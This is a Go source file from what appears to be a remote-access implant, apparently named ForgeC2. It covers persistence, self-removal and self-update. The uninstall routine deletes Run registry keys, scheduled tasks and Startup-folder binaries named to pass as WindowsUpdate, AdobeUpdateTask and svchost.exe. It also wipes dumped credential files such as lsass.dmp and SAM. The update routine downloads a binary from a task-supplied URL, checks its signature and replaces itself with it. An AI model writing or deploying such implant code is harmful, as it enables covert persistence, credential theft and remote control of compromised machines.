//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"crypto/ed25519"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"time"
)

func addPersistence() {
	switch runtime.GOOS {
	case "windows":
		addPersistenceWindows()
	case "linux":
		addPersistenceLinux()
	case "darwin":
		addPersistenceDarwin()
	default:
		if Debug {
			fmt.Printf("[*] Persistence not implemented for %s\n", runtime.GOOS)
		}
	}
}

// selfRemove removes the implant
func uninstallSelf() (string, error) {
	// best effort cleanup — remove BOTH persistence naming schemes
	// (auto-install: WindowsUpdate/AdobeUpdateTask/svchost.exe and explicit:
	// ForgeC2/ForgeC2Update/ForgeC2.exe) so nothing is left behind regardless
	// of which install path was used.
		if runtime.GOOS == "windows" {
		for _, name := range []string{persistencePrefix, "WindowsUpdate"} {
			runShell(`reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v `+name+` /f`, "cmd.exe")
		}
		for _, name := range []string{persistencePrefix, persistencePrefix + "Update", "AdobeUpdateTask"} {
			runShell("schtasks /delete /tn "+name+" /f", "cmd.exe")
		}
		appData := os.Getenv("APPDATA")
		startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)
		for _, name := range []string{"svchost.exe", persistencePrefix + ".exe"} {
			os.Remove(filepath.Join(startupDir, name))
		}
		// Scrub dumped credential material (lsass.dmp / SAM / SYSTEM / SECURITY)
		// so a removed implant does not leave the crown jewels on disk.
		cleanupCredDumpFiles()
	}
	// delete self file (best effort)
	exe, _ := os.Executable()
	go func() {
		time.Sleep(1 * time.Second)
		os.Remove(exe)
	}()
	return "uninstall attempted (self-delete may take effect after exit)", nil
}

// updatePinnedPubKeyHex is the compile-time trust root for self-updates. When
// non-empty, self_update verifies ONLY against this ed25519 public key and
// ignores any key supplied in the task — so an operator (or anyone able to
// issue a task) cannot sign and execute an arbitrary binary. Build pipelines
// should stamp this via -ldflags so every implant trusts only the vendor key.
// When empty, the task-supplied key is used (legacy behavior; logged).
var updatePinnedPubKeyHex = ""

// verifyUpdateSignature decodes an ed25519 public key (hex) and checks the
// signature over hash. Centralized so the pinned-key trust root is testable.
func verifyUpdateSignature(pubKeyHex string, hash, sig []byte) bool {
	pk, err := hex.DecodeString(pubKeyHex)
	if err != nil {
		return false
	}
	return ed25519.Verify(ed25519.PublicKey(pk), hash, sig)
}

// selfUpdate downloads a new binary from a signed URL and verifies its integrity
func selfUpdate(cmdJSON string) string {
	var params struct {
		URL       string `json:"url"`
		Signature string `json:"signature"`
		PublicKey string `json:"public_key"`
	}
	if err := json.Unmarshal([]byte(cmdJSON), &params); err != nil {
		return "failed to parse update command: " + err.Error()
	}
	if params.URL == "" {
		return "self_update: download URL required"
	}

	signature, err := hex.DecodeString(params.Signature)
	if err != nil {
		return "failed to decode signature: " + err.Error()
	}

	// Prefer a pinned, compile-time trust root over any key shipped in the task.
	verifyKeyHex := params.PublicKey
	if updatePinnedPubKeyHex != "" {
		verifyKeyHex = updatePinnedPubKeyHex
	} else if Debug {
		fmt.Printf("[!] self_update: no pinned update key configured; trusting task-supplied key\n")
	}
	if _, err := hex.DecodeString(verifyKeyHex); err != nil {
		return "failed to decode public key: " + err.Error()
	}

	exe, err := os.Executable()
	if err != nil {
		return "failed to get executable path: " + err.Error()
	}

	// Download new binary
	tmpPath := exe + ".update.tmp"
	out, err := os.Create(tmpPath)
	if err != nil {
		return "failed to create temp file: " + err.Error()
	}

	httpReq, err := http.NewRequest("GET", params.URL, nil)
	if err != nil {
		out.Close()
		os.Remove(tmpPath)
		return "failed to create request: " + err.Error()
	}
	httpReq.Header.Set("User-Agent", getActiveUserAgentFromConfig())
	httpReq.Header.Set("Content-Type", "application/octet-stream")

	resp, err := client.Do(httpReq)
	if err != nil {
		out.Close()
		os.Remove(tmpPath)
		return "failed to download update: " + err.Error()
	}
	defer resp.Body.Close()

	// Write binary and compute SHA-256 hash simultaneously
	hasher := sha256.New()
	tee := io.TeeReader(resp.Body, hasher)
	written, err := io.Copy(out, tee)
	out.Close()
	if err != nil {
		os.Remove(tmpPath)
		return "failed to write update: " + err.Error()
	}
	if written == 0 {
		os.Remove(tmpPath)
		return "downloaded file is empty"
	}

	// Verify ed25519 signature of the SHA-256 hash
	hash := hasher.Sum(nil)
	if !verifyUpdateSignature(verifyKeyHex, hash, signature) {
		os.Remove(tmpPath)
		return "signature verification failed: binary may be tampered"
	}

	// TOCTOU mitigation: re-read the temp file and re-verify immediately
	// before handing it to the platform updater, so a swap of the temp file
	// between verification and replacement is detected.
	if f, rerr := os.Open(tmpPath); rerr == nil {
		rh := sha256.New()
		if _, rerr := io.Copy(rh, f); rerr == nil {
			if !verifyUpdateSignature(verifyKeyHex, rh.Sum(nil), signature) {
				f.Close()
				os.Remove(tmpPath)
				return "signature verification failed after re-check: binary may be tampered"
			}
		}
		f.Close()
	}

	// Make temp file executable (Linux)
	if runtime.GOOS != "windows" {
		os.Chmod(tmpPath, 0755)
	}

	// Create wrapper script to replace and restart
	switch runtime.GOOS {
	case "windows":
		return selfUpdateWindows(exe, tmpPath)
	case "darwin":
		return selfUpdateDarwin(exe, tmpPath)
	default:
		return selfUpdateLinux(exe, tmpPath)
	}
}
